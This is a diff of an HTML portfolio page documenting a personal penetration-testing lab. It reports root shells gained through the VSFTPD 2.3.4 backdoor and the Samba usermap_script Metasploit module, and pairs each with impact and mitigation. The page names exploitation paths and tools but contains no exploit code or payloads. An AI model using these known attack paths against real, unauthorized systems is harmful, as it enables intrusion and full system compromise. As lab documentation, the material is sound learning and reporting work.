-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/SAMBA-1.png"
-                                alt="Metasploit Samba usermap script exploitation"
-                            >
-
-                            <p class="evidence-caption">
-                                The Samba usermap_script module successfully
-                                established a remote command shell.
-                            </p>
-
-                        </div>
-
-
-                        <div class="evidence-image">
-
-                            <img
-                                src="../images/vulnerability-lab/SAMBA- 2.png"
-                                alt="Samba remote shell showing root command execution"
-                            >
-
-                            <p class="evidence-caption">
-                                The remote shell returned root, validating privileged
-                                command execution through the Samba service.
-                            </p>
-
-                        </div>
-
-                    </div>
-
                 </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/SAMBA-1.png" alt="Metasploit Samba usermap script exploitation">
+                    <p class="evidence-caption">The Samba module established a remote command shell.</p>
+                </div>
+                <div class="evidence-image">
+                    <img src="../images/vulnerability-lab/SAMBA- 2.png" alt="Samba remote shell showing root execution">
+                    <p class="evidence-caption">The remote shell returned root, validating privileged command execution.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
 
+<section class="project-detail-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">07 — VALIDATED FINDINGS</p>
+            <h2>Controlled Exploitation Findings</h2>
+        </div>
+        <div class="project-text">
+            <div class="finding-card">
+                <div class="finding-header">
+                    <div><p class="section-label">FINDING 01</p><h3>VSFTPD 2.3.4 Backdoor</h3></div>
+                    <span class="severity critical">CRITICAL</span>
+                </div>
+                <p>Controlled testing confirmed unauthorized remote access and root-level command execution.</p>
+                <div class="finding-details">
+                    <div><h4>Evidence</h4><p>Metasploit established a remote session, and shell validation returned root.</p></div>
+                    <div><h4>Impact</h4><p>Successful exploitation may allow complete system compromise and further attacks.</p></div>
+                    <div><h4>Mitigation</h4><p>Remove the vulnerable release, install a supported version, disable unnecessary FTP, and restrict access.</p></div>
+                </div>
             </div>
 
-        </section>
-
-
-        <section class="project-detail-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">05 — FINDINGS</p>
-                    <h2>Key Findings</h2>
+            <div class="finding-card">
+                <div class="finding-header">
+                    <div><p class="section-label">FINDING 02</p><h3>Excessive Exposed Network Services</h3></div>
+                    <span class="severity high">HIGH</span>
                 </div>
-
-                <div class="project-text">
-
-
-                    <div class="finding-card">
-
-                        <div class="finding-header">
-                            <div>
-                                <p class="section-label">FINDING 01</p>
-                                <h3>VSFTPD 2.3.4 Backdoor</h3>
-                            </div>
-
-                            <span class="severity critical">CRITICAL</span>
-                        </div>
-
-                        <p>
-                            Enumeration identified FTP running vsftpd 2.3.4 on
-                            TCP port 21. Controlled testing confirmed unauthorized
-                            remote access and root-level command execution.
-                        </p>
-
-                        <div class="finding-details">
-
-                            <div>
-                                <h4>Evidence</h4>
-                                <p>
-                                    Metasploit established a remote session, and
-                                    shell validation returned root.
-                                </p>
-                            </div>
-
-                            <div>
-                                <h4>Impact</h4>
-                                <p>
-                                    Successful exploitation may allow complete
-                                    system compromise, data access, modification,
-                                    persistence, and further attacks.
-                                </p>
-                            </div>
-
-                            <div>
-                                <h4>Mitigation</h4>
-                                <p>
-                                    Remove the vulnerable release, install a
-                                    supported version from a trusted source, disable
-                                    unnecessary FTP, and restrict network access.
-                                </p>
-                            </div>
-
-                        </div>
-
-                    </div>
-
-
-                    <div class="finding-card">
-
-                        <div class="finding-header">
-                            <div>
-                                <p class="section-label">FINDING 02</p>
-                                <h3>Excessive Exposed Network Services</h3>
-                            </div>
-
-                            <span class="severity high">HIGH</span>
-                        </div>
-
-                        <p>
-                            Enumeration identified more than 20 exposed TCP
-                            services, including legacy protocols, databases,
-                            remote-access services, and multiple application
-                            interfaces.
-                        </p>
-
-                        <div class="finding-details">
-
-                            <div>
-                                <h4>Evidence</h4>
-                                <p>
-                                    Nmap exposed a broad set of services available
-                                    for remote interaction.
-                                </p>
-                            </div>
-
-                            <div>
-                                <h4>Impact</h4>
-                                <p>
-                                    A large attack surface increases the likelihood
-                                    of exploitable software, weak configurations,
-                                    and unnecessary access paths.
-                                </p>
-                            </div>
-
-                            <div>
-                                <h4>Mitigation</h4>
-                                <p>
-                                    Disable unnecessary services, restrict required
-                                    ports with firewalls, segment sensitive services,
-                                    and follow least-functionality principles.
-                                </p>
-                            </div>
-
-                        </div>
-
-                    </div>
-
-
-                    <div class="finding-card">
-
-                        <div class="finding-header">
-                            <div>
-                                <p class="section-label">FINDING 03</p>
-                                <h3>Samba Remote Command Execution</h3>
-                            </div>
-
-                            <span class="severity critical">CRITICAL</span>
-                        </div>
-
-                        <p>
-                            Controlled testing confirmed the Samba service could be
-                            abused to establish a remote command shell with root
-                            privileges.
-                        </p>
-
-                        <div class="finding-details">
-
-                            <div>
-                                <h4>Evidence</h4>
-                                <p>
-                                    The usermap_script module established a remote
-                                    shell, and whoami returned root.
-                                </p>
-                            </div>
-
-                            <div>
-                                <h4>Impact</h4>
-                                <p>
-                                    Remote root execution may allow full system
-                                    control, data compromise, tool deployment, and
-                                    use of the host for further attacks.
-                                </p>
-                            </div>
-
-                            <div>
-                                <h4>Mitigation</h4>
-                                <p>
-                                    Replace unsupported Samba versions, restrict SMB
-                                    to trusted systems, disable unnecessary services,
-                                    and segment administrative protocols.
-                                </p>
-                            </div>
-
-                        </div>
-
-                        
-
-                        </div>
-
-                    </div>
-
+                <p>Enumeration identified more than 20 exposed TCP services, including legacy protocols and remote-access interfaces.</p>
+                <div class="finding-details">
+                    <div><h4>Evidence</h4><p>Nmap exposed a broad set of remotely accessible services.</p></div>
+                    <div><h4>Impact</h4><p>A large attack surface increases the likelihood of exploitable software and weak configurations.</p></div>
+                    <div><h4>Mitigation</h4><p>Disable unnecessary services, restrict ports, segment sensitive systems, and follow least functionality.</p></div>
                 </div>
-
             </div>
 
-        </section>
-
-
-        <section class="project-detail-section alternate-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">06 — SECURITY OUTCOMES</p>
-                    <h2>Assessment Outcomes</h2>
+            <div class="finding-card">
+                <div class="finding-header">
+                    <div><p class="section-label">FINDING 03</p><h3>Samba Remote Command Execution</h3></div>
+                    <span class="severity critical">CRITICAL</span>
                 </div>
-
-                <div class="project-text">
-
-                    <p>
-                        The completed engagement demonstrated a structured
-                        offensive-security workflow from preparation and discovery
-                        through exploitation, validation, analysis, and remediation.
-                    </p>
-
-                    <div class="outcomes-grid">
-
-                        <div class="outcome-card">
-                            <p class="card-label">PREPARATION</p>
-                            <h3>Validated Attack Platform</h3>
-                            <p>
-                                Established network connectivity and verified the
-                                required reconnaissance toolkit.
-                            </p>
-                        </div>
-
-                        <div class="outcome-card">
-                            <p class="card-label">ATTACK SURFACE</p>
-                            <h3>Service Discovery</h3>
-                            <p>
-                                Identified exposed services and prioritized
-                                potential attack paths.
-                            </p>
-                        </div>
-
-                        <div class="outcome-card">
-                            <p class="card-label">VALIDATION</p>
-                            <h3>Evidence-Based Assessment</h3>
-                            <p>
-                                Validated selected weaknesses through controlled
-                                testing rather than relying only on version data.
-                            </p>
-                        </div>
-
-                        <div class="outcome-card">
-                            <p class="card-label">EXPLOITATION</p>
-                            <h3>Multiple Remote Attack Paths</h3>
-                            <p>
-                                Confirmed exploitable weaknesses in VSFTPD and
-                                Samba.
-                            </p>
-                        </div>
-
-                        <div class="outcome-card">
-                            <p class="card-label">ACCESS</p>
-                            <h3>Root-Level Execution</h3>
-                            <p>
-                                Verified privileged command execution through
-                                interactive remote shells.
-                            </p>
-                        </div>
-
-                        <div class="outcome-card">
-                            <p class="card-label">REPORTING</p>
-                            <h3>Actionable Remediation</h3>
-                            <p>
-                                Documented evidence, impact, severity, and practical
-                                mitigation recommendations.
-                            </p>
-                        </div>
-
-                    </div>
-
+                <p>Controlled testing confirmed a remote command shell with root privileges.</p>
+                <div class="finding-details">
+                    <div><h4>Evidence</h4><p>The usermap_script module established a shell, and whoami returned root.</p></div>
+                    <div><h4>Impact</h4><p>Remote root execution may allow full system control and further attacks.</p></div>
+                    <div><h4>Mitigation</h4><p>Replace unsupported Samba versions, restrict SMB, disable unnecessary services, and segment administrative protocols.</p></div>
                 </div>
-
             </div>
+        </div>
+    </div>
+</section>
 
-        </section>
-
-
-        <section class="project-detail-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">07 — SKILLS DEMONSTRATED</p>
-                    <h2>Technical Skills Demonstrated</h2>
-                </div>
-
-                <div class="project-text">
-
-                    <p>
-                        This project required hands-on work across attacker
-                        preparation, reconnaissance, enumeration, vulnerability
-                        validation, exploitation, privilege verification, and
-                        remediation-focused reporting.
-                    </p>
-
-                    <div class="skills-demonstrated-grid">
-
-                        <div class="skill-demonstrated-card">
-                            <p class="card-label">PREPARATION</p>
-                            <h3>Kali Linux</h3>
-                            <p>
-                                Configured the offensive workstation, validated
-                                connectivity, and verified the assessment toolkit.
-                            </p>
-                            <div class="skill-tags">
-                                <span>Kali Linux</span>
-                                <span>Networking</span>
-                                <span>Tool Validation</span>
-                            </div>
-                        </div>
-
-                        <div class="skill-demonstrated-card">
-                            <p class="card-label">RECONNAISSANCE</p>
-                            <h3>Network Discovery</h3>
-                            <p>
-                                Identified target connectivity and exposed network
-                                services.
-                            </p>
-                            <div class="skill-tags">
-                                <span>Nmap</span>
-                                <span>Host Discovery</span>
-                                <span>Attack Surface</span>
-                            </div>
-                        </div>
-
-                        <div class="skill-demonstrated-card">
-                            <p class="card-label">ENUMERATION</p>
-                            <h3>Service & Version Analysis</h3>
-                            <p>
-                                Collected service, version, operating-system, and
-                                application context.
-                            </p>
-                            <div class="skill-tags">
-                                <span>Nmap -sV</span>
-                                <span>Nmap -A</span>
-                                <span>Enumeration</span>
-                            </div>
-                        </div>
-
-                        <div class="skill-demonstrated-card">
-                            <p class="card-label">EXPLOITATION</p>
-                            <h3>Metasploit Framework</h3>
-                            <p>
-                                Configured and executed controlled modules against
-                                intentionally vulnerable services.
-                            </p>
-                            <div class="skill-tags">
-                                <span>Metasploit</span>
-                                <span>VSFTPD</span>
-                                <span>Samba</span>
-                            </div>
-                        </div>
-
-                        <div class="skill-demonstrated-card">
-                            <p class="card-label">POST-EXPLOITATION</p>
-                            <h3>Privilege Verification</h3>
-                            <p>
-                                Used interactive shells and Linux commands to
-                                confirm compromise and root-level execution.
-                            </p>
-                            <div class="skill-tags">
-                                <span>Shell Access</span>
-                                <span>whoami</span>
-                                <span>Linux</span>
-                            </div>
-                        </div>
-
-                        <div class="skill-demonstrated-card">
-                            <p class="card-label">REPORTING</p>
-                            <h3>Security Assessment Reporting</h3>
-                            <p>
-                                Communicated findings using evidence, impact,
-                                severity, and remediation recommendations.
-                            </p>
-                            <div class="skill-tags">
-                                <span>Technical Reporting</span>
-                                <span>Risk Analysis</span>
-                                <span>Mitigation</span>
-                            </div>
-                        </div>
-
-                    </div>
-
-                </div>
-
+<section class="project-detail-section alternate-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">08 — CURRENT OUTCOMES</p>
+            <h2>Project Outcomes</h2>
+        </div>
+        <div class="project-text">
+            <div class="outcomes-grid">
+                <div class="outcome-card"><p class="card-label">PREPARATION</p><h3>Validated Attack Platform</h3><p>Established connectivity and verified the offensive toolset.</p></div>
+                <div class="outcome-card"><p class="card-label">ENTERPRISE RECON</p><h3>Asset & Role Discovery</h3><p>Identified DC01, WS01, and FS01 and mapped their roles.</p></div>
+                <div class="outcome-card"><p class="card-label">ENUMERATION</p><h3>Service Attack-Surface Mapping</h3><p>Profiled services across the enterprise environment.</p></div>
+                <div class="outcome-card"><p class="card-label">EXPLOITATION</p><h3>Controlled Remote Attack Paths</h3><p>Confirmed exploitable weaknesses in VSFTPD and Samba.</p></div>
+                <div class="outcome-card"><p class="card-label">ACCESS</p><h3>Root-Level Execution</h3><p>Verified privileged command execution through remote shells.</p></div>
+                <div class="outcome-card"><p class="card-label">REPORTING</p><h3>Actionable Remediation</h3><p>Documented evidence, impact, severity, and mitigation.</p></div>
             </div>
+        </div>
+    </div>
+</section>
 
-        </section>
-
-
-        <section class="project-detail-section alternate-section">
-
-            <div class="section-container project-content">
-
-                <div class="project-section-heading">
-                    <p class="section-label">08 — LESSONS LEARNED</p>
-                    <h2>Lessons Learned & Project Takeaways</h2>
-                </div>
-
-                <div class="project-text">
-
-                    <p>
-                        The assessment reinforced that effective penetration
-                        testing depends on disciplined progression from discovery
-                        to evidence gathering, targeted validation, and clear
-                        reporting.
-                    </p>
-
-                    <div class="lessons-grid">
-
-                        <div class="lesson-card">
-                            <p class="card-label">01 — PREPARATION</p>
-                            <h3>Validate the Platform First</h3>
-                            <p>
-                                Network and tool validation reduced uncertainty
-                                before testing began.
-                            </p>
-                        </div>
-
-                        <div class="lesson-card">
-                            <p class="card-label">02 — ENUMERATION</p>
-                            <h3>Open Ports Are Starting Points</h3>
-                            <p>
-                                Version and configuration context are required
-                                before selecting an attack path.
-                            </p>
-                        </div>
-
-                        <div class="lesson-card">
-                            <p class="card-label">03 — VALIDATION</p>
-                            <h3>Evidence Matters More Than Assumptions</h3>
-                            <p>
-                                Controlled testing distinguished exploitable
-                                weaknesses from general attack-surface observations.
-                            </p>
-                        </div>
-
-                        <div class="lesson-card">
-                            <p class="card-label">04 — ACCESS</p>
-                            <h3>Verify the Result</h3>
-                            <p>
-                                Session establishment alone was not enough; command
-                                execution and privilege level were validated.
-                            </p>
-                        </div>
-
-                        <div class="lesson-card">
-                            <p class="card-label">05 — SCOPE</p>
-                            <h3>Controlled Environments Enable Safe Practice</h3>
-                            <p>
-                                All testing remained within intentionally vulnerable,
-                                personally controlled systems.
-                            </p>
-                        </div>
-
-                        <div class="lesson-card">
-                            <p class="card-label">06 — REPORTING</p>
-                            <h3>Findings Must Support Remediation</h3>
-                            <p>
-                                Evidence and impact are most useful when paired with
-                                practical mitigation guidance.
-                            </p>
-                        </div>
-
-                    </div>
-
-                    <div class="project-takeaway">
-
-                        <p class="card-label">FINAL TAKEAWAY</p>
-
-                        <h3>From Reconnaissance to Validated Risk</h3>
-
-                        <p>
-                            This project demonstrated how an attacker can move from
-                            initial discovery to root-level compromise through
-                            exposed, vulnerable services.
-                        </p>
-
-                        <p>
-                            More importantly, it strengthened my ability to validate
-                            security findings methodically and communicate them as
-                            actionable risks rather than presenting tool output alone.
-                        </p>
-
-                    </div>
-
-                </div>
-
+<section class="project-detail-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">09 — SKILLS DEMONSTRATED</p>
+            <h2>Technical Skills Demonstrated</h2>
+        </div>
+        <div class="project-text">
+            <div class="skills-demonstrated-grid">
+                <div class="skill-demonstrated-card"><p class="card-label">PREPARATION</p><h3>Kali Linux</h3><p>Configured the attacker workstation and verified the toolset.</p><div class="skill-tags"><span>Kali Linux</span><span>Networking</span><span>Tool Validation</span></div></div>
+                <div class="skill-demonstrated-card"><p class="card-label">RECONNAISSANCE</p><h3>Enterprise Host Discovery</h3><p>Identified live hosts and infrastructure roles.</p><div class="skill-tags"><span>Nmap</span><span>Host Discovery</span><span>Asset Mapping</span></div></div>
+                <div class="skill-demonstrated-card"><p class="card-label">ENUMERATION</p><h3>Windows Service Analysis</h3><p>Profiled DC01, WS01, and FS01 services.</p><div class="skill-tags"><span>SMB</span><span>LDAP</span><span>Kerberos</span><span>RPC</span></div></div>
+                <div class="skill-demonstrated-card"><p class="card-label">EXPLOITATION</p><h3>Metasploit Framework</h3><p>Executed controlled modules against vulnerable services.</p><div class="skill-tags"><span>Metasploit</span><span>VSFTPD</span><span>Samba</span></div></div>
+                <div class="skill-demonstrated-card"><p class="card-label">POST-EXPLOITATION</p><h3>Privilege Verification</h3><p>Confirmed compromise and root-level execution.</p><div class="skill-tags"><span>Shell Access</span><span>whoami</span><span>Linux</span></div></div>
+                <div class="skill-demonstrated-card"><p class="card-label">REPORTING</p><h3>Security Assessment Reporting</h3><p>Communicated evidence, impact, severity, and remediation.</p><div class="skill-tags"><span>Technical Reporting</span><span>Risk Analysis</span><span>Mitigation</span></div></div>
             </div>
+        </div>
+    </div>
+</section>
 
-        </section>
-
-
-        <section class="scope-section">
-
-            <div class="section-container">
-
-                <div class="scope-notice">
-
-                    <p class="section-label">AUTHORIZED LAB SCOPE</p>
-
-                    <p>
-                        All testing documented in this project was performed in a
-                        personally controlled VirtualBox environment using
-                        intentionally vulnerable systems designed for cybersecurity
-                        training and educational purposes.
-                    </p>
-
-                </div>
-
+<section class="project-detail-section alternate-section">
+    <div class="section-container project-content">
+        <div class="project-section-heading">
+            <p class="section-label">10 — LESSONS LEARNED</p>
+            <h2>Lessons Learned & Project Direction</h2>
+        </div>
+        <div class="project-text">
+            <div class="lessons-grid">
+                <div class="lesson-card"><p class="card-label">01 — PREPARATION</p><h3>Validate the Platform First</h3><p>Network and tool validation reduced uncertainty before testing.</p></div>
+                <div class="lesson-card"><p class="card-label">02 — SCOPE</p><h3>Asset Roles Shape the Attack Surface</h3><p>Domain controllers, workstations, and file servers expose different attack paths.</p></div>
+                <div class="lesson-card"><p class="card-label">03 — ENUMERATION</p><h3>Open Ports Are Starting Points</h3><p>Service, version, host, and role context are required before selecting a path.</p></div>
+                <div class="lesson-card"><p class="card-label">04 — VALIDATION</p><h3>Evidence Matters More Than Assumptions</h3><p>Controlled testing distinguished exploitable weaknesses from observations.</p></div>
+                <div class="lesson-card"><p class="card-label">05 — DEFENSE</p><h3>Offense and Detection Should Be Connected</h3><p>Pairing attacker actions with Blue Team telemetry strengthens both projects.</p></div>
+                <div class="lesson-card"><p class="card-label">06 — REPORTING</p><h3>Findings Must Support Remediation</h3><p>Evidence and impact are most useful with practical mitigation guidance.</p></div>
             </div>
-
-        </section>
-
-
-        <section class="project-footer-section">
-
-            <div class="section-container">
-
-                <div class="project-footer">
-
-                    <div class="project-footer-text">
-
-                        <p class="section-label">PROJECT COMPLETE</p>
-
-                        <h2>Offensive Security & Penetration Testing</h2>
-
-                        <p>
-                            A structured offensive-security assessment documenting
-                            preparation, reconnaissance, enumeration, controlled
-                            exploitation, privilege verification, risk analysis,
-                            remediation, and reporting.
-                        </p>
-
-                    </div>
-
-                    <div class="project-footer-actions">
-
-                        <a href="../index.html#projects" class="btn secondary-btn">
-                            ← Back to Projects
-                        </a>
-
-                        <a href="blue-team-operations.html" class="btn primary-btn">
-                            View Blue Team Operations →
-                        </a>
-
-                    </div>
-
-                </div>
-
+            <div class="project-takeaway">
+                <p class="card-label">CURRENT TAKEAWAY</p>
+                <h3>From Training Exploitation to Enterprise Assessment</h3>
+                <p>The project has progressed from exploitation practice against intentionally vulnerable systems into a broader enterprise penetration test.</p>
+                <p>Future evidence will document deeper Active Directory testing and show how the Blue Team environment detects and responds to the same activity.</p>
             </div>
+        </div>
+    </div>
+</section>
 
-        </section>
+<section class="scope-section">
+    <div class="section-container">
+        <div class="scope-notice">
+            <p class="section-label">AUTHORIZED LAB SCOPE</p>
+            <p>
+                All testing documented in this project was performed in a personally
+                controlled VirtualBox environment against systems I own and administer,
+                including intentionally vulnerable training targets and the Windows
+                enterprise lab built for cybersecurity education.
+            </p>
+        </div>
+    </div>
+</section>
 
-    </main>
-
+<section class="project-footer-section">
+    <div class="section-container">
+        <div class="project-footer">
+            <div class="project-footer-text">
+                <p class="section-label">PROJECT IN ACTIVE DEVELOPMENT</p>
+                <h2>Offensive Security & Penetration Testing</h2>
+                <p>
+                    An expanding enterprise offensive-security engagement covering
+                    preparation, reconnaissance, enumeration, controlled exploitation,
+                    privilege validation, defensive detection, risk analysis, and reporting.
+                </p>
+            </div>
+            <div class="project-footer-actions">
+                <a href="../index.html#projects" class="btn secondary-btn">← Back to Projects</a>
+                <a href="blue-team-operations.html" class="btn primary-btn">View Blue Team Operations →</a>
+            </div>
+        </div>
+    </div>
+</section>
+</main>
 </body>
-
 </html>
